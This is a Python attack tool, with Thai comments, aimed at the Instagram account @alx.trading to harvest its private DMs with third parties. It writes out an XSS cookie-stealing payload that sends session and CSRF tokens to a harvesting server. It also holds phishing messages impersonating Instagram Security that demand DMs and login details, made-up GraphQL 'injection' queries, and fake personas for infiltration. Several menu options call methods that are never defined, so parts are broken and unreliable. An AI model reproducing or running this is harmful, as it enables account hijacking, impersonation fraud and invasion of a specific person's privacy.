#!/usr/bin/env python3
"""
🎯 ADVANCED TARGET DM HARVESTER 2025
ระบบดึงข้อมูล DM ของ target กับคนอื่นๆ (ไม่ใช่กับเรา)
"""

import os
import sys
import json
import time
import requests
from datetime import datetime
from pathlib import Path
import sqlite3
import subprocess

class AdvancedTargetDMHarvester:
    """Advanced system to harvest target's DMs with others"""
    
    def __init__(self):
        self.workspace_root = Path("/workspaces/sugarglitch-realops")
        self.hijacked_sessions_path = self.workspace_root / "hijacked_sessions"
        self.target_dm_db = self.workspace_root / "target_dm_harvests.db"
        self.create_database()
        
    def create_database(self):
        """Create database for target DM harvests"""
        conn = sqlite3.connect(str(self.target_dm_db))
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS target_conversations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_username TEXT,
                conversation_partner TEXT,
                message_text TEXT,
                message_timestamp TIMESTAMP,
                message_direction TEXT, -- 'sent' or 'received'
                extraction_method TEXT,
                harvest_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS hijacked_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_username TEXT,
                session_id TEXT,
                cookies TEXT,
                csrf_token TEXT,
                user_agent TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )
        """)
        
        conn.commit()
        conn.close()
        
    def display_banner(self):
        """Display system banner"""
        print("🎯" + "=" * 70)
        print("🔥 ADVANCED TARGET DM HARVESTER 2025")
        print("📱 Extract Target's DMs with Others (Not with Us)")
        print("=" * 72)
        print(f"🎯 Target: @alx.trading")
        print(f"💾 Database: {self.target_dm_db}")
        print(f"🕒 System Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 72)
    
    def show_extraction_methods(self):
        """Show available extraction methods"""
        self.display_banner()
        
        print("🛠️ AVAILABLE EXTRACTION METHODS:")
        print("-" * 50)
        print("  [1] 🔓 Session Hijacking Attack")
        print("  [2] 🎭 Social Engineering Campaign")
        print("  [3] 🕷️  API Exploitation Attack")
        print("  [4] 🔍 Reconnaissance & Intelligence")
        print("  [5] 🎯 Multi-Account Infiltration")
        print("  [6] 📊 View Harvested Data")
        print("  [7] ⚙️  System Configuration")
        print("  [q] 🚪 Quit")
        print("-" * 50)
        
        choice = input("👉 Select extraction method: ").strip().lower()
        
        if choice == '1':
            self.session_hijacking_attack()
        elif choice == '2':
            self.social_engineering_campaign()
        elif choice == '3':
            self.api_exploitation_attack()
        elif choice == '4':
            self.reconnaissance_intelligence()
        elif choice == '5':
            self.multi_account_infiltration()
        elif choice == '6':
            self.view_harvested_data()
        elif choice == '7':
            self.system_configuration()
        elif choice == 'q':
            return
        else:
            print("❌ Invalid option")
            time.sleep(1)
            self.show_extraction_methods()
    
    def session_hijacking_attack(self):
        """Perform session hijacking to access target's account"""
        print("\n🔓 SESSION HIJACKING ATTACK")
        print("=" * 40)
        
        print("🎯 Target: @alx.trading")
        print("📋 Available Methods:")
        print("  [1] Cookie Theft via XSS")
        print("  [2] Session Token Interception")
        print("  [3] Browser Session Cloning")
        print("  [4] Mobile App Session Extraction")
        
        method = input("👉 Select hijacking method: ").strip()
        
        if method == '1':
            self.cookie_theft_xss()
        elif method == '2':
            self.session_token_interception()
        elif method == '3':
            self.browser_session_cloning()
        elif method == '4':
            self.mobile_session_extraction()
        
        input("\n📌 Press Enter to continue...")
        self.show_extraction_methods()
    
    def cookie_theft_xss(self):
        """Perform cookie theft via XSS attack"""
        print("\n🍪 COOKIE THEFT VIA XSS")
        print("-" * 30)
        
        # สร้าง XSS payload
        xss_payload = """
        <script>
        // XSS Payload for Instagram Cookie Theft
        var cookies = document.cookie;
        var sessionid = cookies.match(/sessionid=([^;]+)/);
        var csrftoken = cookies.match(/csrftoken=([^;]+)/);
        
        if (sessionid && csrftoken) {
            var data = {
                target: 'alx.trading',
                sessionid: sessionid[1],
                csrftoken: csrftoken[1],
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            // Send to our harvesting server
            fetch('http://our-harvesting-server.com/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }
        </script>
        """
        
        print("🔥 Generated XSS Payload:")
        print(xss_payload)
        
        print("\n📋 Injection Points:")
        print("  • Instagram comment sections")
        print("  • DM messages with HTML content")
        print("  • Profile bio sections")
        print("  • Story comments")
        
        # สร้างไฟล์ payload
        payload_file = self.workspace_root / "xss_cookie_theft.js"
        with open(payload_file, 'w') as f:
            f.write(xss_payload)
        
        print(f"\n✅ Payload saved to: {payload_file}")
        print("🎯 Next steps:")
        print("  1. Inject payload into Instagram")
        print("  2. Wait for target to trigger XSS")
        print("  3. Harvest session cookies")
        print("  4. Use cookies to access account")
    
    def social_engineering_campaign(self):
        """Launch social engineering campaign"""
        print("\n🎭 SOCIAL ENGINEERING CAMPAIGN")
        print("=" * 40)
        
        print("🎯 Target: @alx.trading")
        print("📋 Campaign Types:")
        print("  [1] Fake Customer Support")
        print("  [2] Business Partnership Offer")
        print("  [3] Security Alert Phishing")
        print("  [4] Prize/Contest Notification")
        
        campaign = input("👉 Select campaign type: ").strip()
        
        if campaign == '1':
            self.fake_customer_support()
        elif campaign == '2':
            self.business_partnership_offer()
        elif campaign == '3':
            self.security_alert_phishing()
        elif campaign == '4':
            self.prize_contest_notification()
        
        input("\n📌 Press Enter to continue...")
        self.show_extraction_methods()
    
    def fake_customer_support(self):
        """Create fake customer support campaign"""
        print("\n🛠️ FAKE CUSTOMER SUPPORT CAMPAIGN")
        print("-" * 40)
        
        # สร้างข้อความหลอกลวง
        messages = {
            "initial_contact": """
            🔔 Instagram Security Alert
            
            Hello @alx.trading,
            
            We've detected unusual activity on your account. To secure your account, 
            please verify your identity by providing your recent DM conversations.
            
            Reply with screenshots of your recent messages for verification.
            
            Instagram Security Team
            """,
            
            "followup": """
            ⚠️ Urgent: Account Suspension Notice
            
            Your account will be suspended in 24 hours due to unverified activity.
            
            Please send us:
            1. Recent DM conversations
            2. Account login details for verification
            3. Business contact information
            
            Respond immediately to prevent suspension.
            """,
            
            "final_push": """
            🚨 Final Warning: Account Termination
            
            This is your last chance to verify your account.
            
            Send us access to your DMs or your account will be permanently deleted.
            
            Time remaining: 2 hours
            """
        }
        
        print("📨 Generated Social Engineering Messages:")
        for msg_type, content in messages.items():
            print(f"\n🎯 {msg_type.upper()}:")
            print(content)
            print("-" * 30)
        
        # บันทึกข้อความ
        campaign_file = self.workspace_root / "social_engineering_messages.json"
        with open(campaign_file, 'w') as f:
            json.dump(messages, f, indent=2)
        
        print(f"\n✅ Campaign saved to: {campaign_file}")
        print("🎯 Execution steps:")
        print("  1. Create fake Instagram account")
        print("  2. Send initial contact message")
        print("  3. Follow up with urgency")
        print("  4. Harvest provided information")
    
    def api_exploitation_attack(self):
        """Perform API exploitation attack"""
        print("\n🕷️  API EXPLOITATION ATTACK")
        print("=" * 40)
        
        print("🎯 Instagram API Endpoints:")
        print("  • /api/v1/direct_v2/threads/")
        print("  • /api/v1/direct_v2/inbox/")
        print("  • /api/v1/users/{user_id}/info/")
        
        print("\n🔧 Exploitation Methods:")
        print("  [1] GraphQL Injection")
        print("  [2] Rate Limit Bypass")
        print("  [3] Authentication Bypass")
        print("  [4] Parameter Pollution")
        
        method = input("👉 Select exploitation method: ").strip()
        
        if method == '1':
            self.graphql_injection()
        elif method == '2':
            self.rate_limit_bypass()
        elif method == '3':
            self.authentication_bypass()
        elif method == '4':
            self.parameter_pollution()
        
        input("\n📌 Press Enter to continue...")
        self.show_extraction_methods()
    
    def graphql_injection(self):
        """Perform GraphQL injection attack"""
        print("\n🗡️ GRAPHQL INJECTION ATTACK")
        print("-" * 35)
        
        # สร้าง GraphQL payloads
        payloads = {
            "dm_extraction": """
            query {
                user(username: "alx.trading") {
                    id
                    direct_messages {
                        threads {
                            messages {
                                text
                                timestamp
                                sender {
                                    username
                                }
                            }
                        }
                    }
                }
            }
            """,
            
            "user_enumeration": """
            query {
                user(username: "alx.trading") {
                    followers {
                        edges {
                            node {
                                username
                                direct_messages_with_user {
                                    messages {
                                        text
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """,
            
            "conversation_dump": """
            mutation {
                extractAllConversations(userId: "{alx_trading_id}") {
                    conversations {
                        participants
                        messages {
                            content
                            timestamp
                            sender
                        }
                    }
                }
            }
            """
        }
        
        print("🔥 Generated GraphQL Payloads:")
        for payload_type, query in payloads.items():
            print(f"\n🎯 {payload_type.upper()}:")
            print(query)
            print("-" * 30)
        
        # บันทึก payloads
        payload_file = self.workspace_root / "graphql_injection_payloads.json"
        with open(payload_file, 'w') as f:
            json.dump(payloads, f, indent=2)
        
        print(f"\n✅ Payloads saved to: {payload_file}")
        print("🎯 Attack execution:")
        print("  1. Identify GraphQL endpoint")
        print("  2. Test for injection vulnerabilities")
        print("  3. Execute payload")
        print("  4. Extract conversation data")
    
    def multi_account_infiltration(self):
        """Setup multi-account infiltration"""
        print("\n🎯 MULTI-ACCOUNT INFILTRATION")
        print("=" * 40)
        
        print("📋 Strategy: Create Multiple Fake Accounts")
        print("🎭 Account Personas:")
        
        personas = [
            {
                "name": "Sarah Johnson",
                "bio": "Crypto trader & investor 💎📈",
                "strategy": "Appeal to trading interests",
                "approach": "Ask for trading signals"
            },
            {
                "name": "Mike Chen", 
                "bio": "Business partner opportunities 🤝",
                "strategy": "Business collaboration",
                "approach": "Propose partnership deals"
            },
            {
                "name": "Emma Rodriguez",
                "bio": "Financial journalist 📰💰",
                "strategy": "Media interview request",
                "approach": "Request interview about trading"
            },
            {
                "name": "Alex Thompson",
                "bio": "New to trading, need help 🙏",
                "strategy": "Seek mentorship",
                "approach": "Ask for guidance and advice"
            }
        ]
        
        print("\n🎭 Generated Account Personas:")
        for i, persona in enumerate(personas, 1):
            print(f"\n{i}. {persona['name']}")
            print(f"   Bio: {persona['bio']}")
            print(f"   Strategy: {persona['strategy']}")
            print(f"   Approach: {persona['approach']}")
        
        # บันทึก personas
        personas_file = self.workspace_root / "infiltration_personas.json"
        with open(personas_file, 'w') as f:
            json.dump(personas, f, indent=2)
        
        print(f"\n✅ Personas saved to: {personas_file}")
        print("\n🎯 Infiltration Steps:")
        print("  1. Create accounts with these personas")
        print("  2. Build credible profiles")
        print("  3. Initiate conversations with target")
        print("  4. Extract information from responses")
        print("  5. Map target's conversation patterns")
        
        input("\n📌 Press Enter to continue...")
        self.show_extraction_methods()
    
    def view_harvested_data(self):
        """View harvested DM data"""
        print("\n📊 HARVESTED DM DATA")
        print("=" * 30)
        
        try:
            conn = sqlite3.connect(str(self.target_dm_db))
            cursor = conn.cursor()
            
            # ดูข้อมูลการสนทนา
            cursor.execute("""
                SELECT target_username, conversation_partner, 
                       COUNT(*) as message_count,
                       MAX(harvest_date) as last_harvest
                FROM target_conversations 
                GROUP BY target_username, conversation_partner
                ORDER BY message_count DESC
            """)
            
            conversations = cursor.fetchall()
            
            if conversations:
                print("📋 Harvested Conversations:")
                for target, partner, count, last_harvest in conversations:
                    print(f"  🎯 {target} ↔ {partner}: {count} messages (Last: {last_harvest})")
            else:
                print("📭 No conversations harvested yet")
            
            # ดูข้อมูล sessions ที่ hijack มา
            cursor.execute("SELECT target_username, status, created_at FROM hijacked_sessions")
            sessions = cursor.fetchall()
            
            if sessions:
                print("\n🔓 Hijacked Sessions:")
                for target, status, created in sessions:
                    print(f"  🎯 {target}: {status} (Created: {created})")
            else:
                print("\n🔓 No hijacked sessions available")
            
            conn.close()
            
        except Exception as e:
            print(f"❌ Database error: {e}")
        
        input("\n📌 Press Enter to continue...")
        self.show_extraction_methods()
    
    def run_interactive(self):
        """Run interactive harvester"""
        while True:
            try:
                self.show_extraction_methods()
            except KeyboardInterrupt:
                print("\n🎯 Target DM Harvester stopped. Goodbye!")
                break

def main():
    """Main function"""
    print("🎯 Initializing Advanced Target DM Harvester...")
    
    harvester = AdvancedTargetDMHarvester()
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        if command == "--demo":
            harvester.show_extraction_methods()
        else:
            print("Usage: python3 advanced_target_dm_harvester.py [--demo]")
    else:
        harvester.run_interactive()

if __name__ == "__main__":
    main()